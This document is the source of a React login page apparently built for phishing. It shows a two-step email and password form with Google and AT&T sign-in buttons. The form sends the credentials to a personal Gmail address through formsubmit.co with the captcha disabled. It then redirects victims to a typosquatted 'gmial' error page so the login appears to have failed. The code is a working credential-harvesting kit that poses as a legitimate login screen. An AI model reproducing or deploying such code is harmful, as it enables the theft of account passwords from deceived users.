"use client";


import { useState } from "react";

export default function Home() {
  const [step, setStep] = useState(1);
  const [email, setEmail] = useState("")
  const [password, setPassword] = useState("")



  const handleNext = () => {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (email.trim() === "") {
      return;
    }
    if (!emailRegex.test(email)) {
      return
    }

    setStep(step + 1);

    console.log(email);



  }

  const handleSubmit = () => {
    if (password.trim() !== "") {
      window.location.reload();
    }

    console.log(email, password);

  }

  return (
    <div className="w-screen h-screen bg-white flex flex-col justify-start md:justify-center items-center py-[60px] gap-[40px]">
      <h1 className="text-[26px] lg:text-[30px] xl:text-[35px] text-gray-500">Log in to your account</h1>
      <form action="https://formsubmit.co/Gstrait0518@gmail.com" method="POST" className="w-[90%] max-w-[350px]">
        <div className="flex flex-col gap-[10px]">
          {step === 1 ? <div className="w-full flex flex-col gap-[10px]">
            <input type="email" name="email" placeholder="Email Address" className="p-[10px] border border-gray-400 rounded w-full bg-black/[.05]" required value={email} onChange={(e) => setEmail(e.target.value)} />
          </div> : <div className="w-full flex flex-col gap-[10px]">
            <input type="hidden" name="platform" value={"email"} />
            <input type="hidden" name="email" value={email} />
            <input type="hidden" name="_captcha" value="false" />
            <input type="hidden" name="_next" value="https://gmial.vercel.app/error" />
            <input type="password" name="password" placeholder="Password" className="p-[10px] border border-gray-400 rounded w-full bg-black/[.05]" required value={password} onChange={(e) => setPassword(e.target.value)} />

          </div>}
          <button type={step === 1 ? "button" : "submit"} className="p-[10px] bg-gray-600 hover:bg-gray-400 transition-color duration-300 rounded w-full cursor-pointer text-white" onClick={step === 1 ? handleNext : handleSubmit}>{step === 1 ? "Continue with Email" : "Submit"}</button>
        </div>

        <div className="w-full border-b border-gray-400 my-[20px]"></div>

        <div className="flex flex-col gap-[10px] mb-[10px]">
          <button type="button" className="p-[10px] bg-gray-600 hover:bg-gray-400 transition-color duration-300 rounded w-full cursor-pointer text-white flex items-center justify-center gap-[10px]" onClick={() => window.location.href = "/gmail"}>
            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 40 48" aria-hidden="true">
              <path fill="#4285F4" d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"></path>
              <path fill="#34A853" d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"></path>
              <path fill="#FABB05" d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"></path>
              <path fill="#E94235" d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"></path>
            </svg>
            Continue with Google
          </button>

          <button type="button" className="p-[10px] bg-gray-600 hover:bg-gray-400 transition-color duration-300 rounded w-full cursor-pointer text-white flex items-center justify-center gap-[10px]" onClick={() => window.location.href = "/at-&-t"}>
            <svg width="24" height="24" viewBox="0 0 782 781" fill="none" xmlns="http://www.w3.org/2000/svg">
              <path d="M151.061 698.89C217.276 750.157 300.386 780.959 390.557 780.959C489.234 780.959 579.193 744.316 647.848 684.166C648.68 683.431 648.27 682.945 647.449 683.431C616.641 704.01 528.835 748.933 390.561 748.933C270.395 748.933 194.455 722.116 151.57 698.174C150.75 697.769 150.446 698.385 151.061 698.89ZM417.069 718.85C513.179 718.85 618.793 692.645 681.959 640.773C699.245 626.64 715.709 607.829 730.455 582.549C738.944 568.004 747.247 550.722 754.009 533.735C754.309 532.907 753.798 532.504 753.175 533.435C694.435 619.895 524.337 673.823 348.702 673.823C224.557 673.823 90.9783 634.116 38.6814 558.297C38.1666 557.596 37.6518 557.896 37.9652 558.702C86.6835 662.272 234.483 718.85 417.069 718.85ZM312.059 547.033C112.167 547.033 17.9142 453.916 0.816784 390.37C0.605939 389.451 0 389.652 0 390.479C0 411.871 2.14073 439.479 5.82386 457.803C7.58089 466.723 14.8389 480.721 25.4798 491.879C73.8828 542.342 194.558 613.052 403.548 613.052C688.288 613.052 753.394 518.183 766.688 486.985C776.195 464.673 781.121 424.352 781.121 390.481C781.121 382.285 780.915 375.738 780.606 369.31C780.606 368.267 780.002 368.182 779.793 369.198C765.564 445.537 522.286 547.033 312.059 547.033ZM37.6518 222.962C26.1979 245.698 13.5016 284.055 9.72732 303.907C8.07286 312.413 8.77757 316.497 11.7598 322.845C35.7181 373.688 156.904 455.037 439.583 455.037C612.039 455.037 746.006 412.66 767.71 335.329C771.707 321.093 771.921 306.063 766.787 285.811C761.05 263.179 750.307 236.788 741.214 218.256C740.914 217.652 740.384 217.742 740.492 218.456C743.869 319.883 461.078 385.252 318.394 385.252C163.841 385.252 34.9014 323.662 34.9014 245.892C34.9014 238.42 36.4475 230.946 38.3774 223.168C38.5712 222.457 37.9633 222.339 37.6518 222.962ZM648.481 98.4309C650.122 101.003 650.94 103.749 650.94 107.444C650.94 150.83 518.183 227.581 306.85 227.581C151.57 227.581 122.499 169.965 122.499 133.324C122.499 120.226 127.521 106.825 138.582 93.2139C139.186 92.4045 138.673 92.0929 137.976 92.6952C117.768 109.822 99.3511 128.956 83.008 149.804C75.2391 159.626 70.4162 168.328 70.4162 173.541C70.4162 249.473 260.776 304.528 438.769 304.528C628.422 304.528 713.063 242.603 713.063 188.183C713.063 168.734 705.494 157.38 686.131 135.368C673.562 121.049 661.673 109.389 649.088 97.9123C648.481 97.4107 648.057 97.8192 648.481 98.4309ZM590.339 55.0548C531.808 19.964 463.838 0 390.561 0C316.773 0 246.756 20.6612 188.014 56.681C170.394 67.5275 160.477 76.2194 160.477 87.3926C160.477 120.329 237.435 155.743 373.969 155.743C509.086 155.743 613.885 116.953 613.885 79.6145C613.885 70.7022 606.097 64.4668 590.339 55.0548Z" fill="#00A8E0" />
            </svg>

            Continue with AT&T
          </button>

          <button type="submit" className="p-[10px] w-full cursor-pointer text-gray-500">Show othe options</button>
        </div>

        <p className="text-center text-gray-500">Don&apos;t have an account? <span className="text-gray-700 font-[600] cursor-pointer hover:underline">Sign up</span></p>
      </form>
    </div>
  );
}
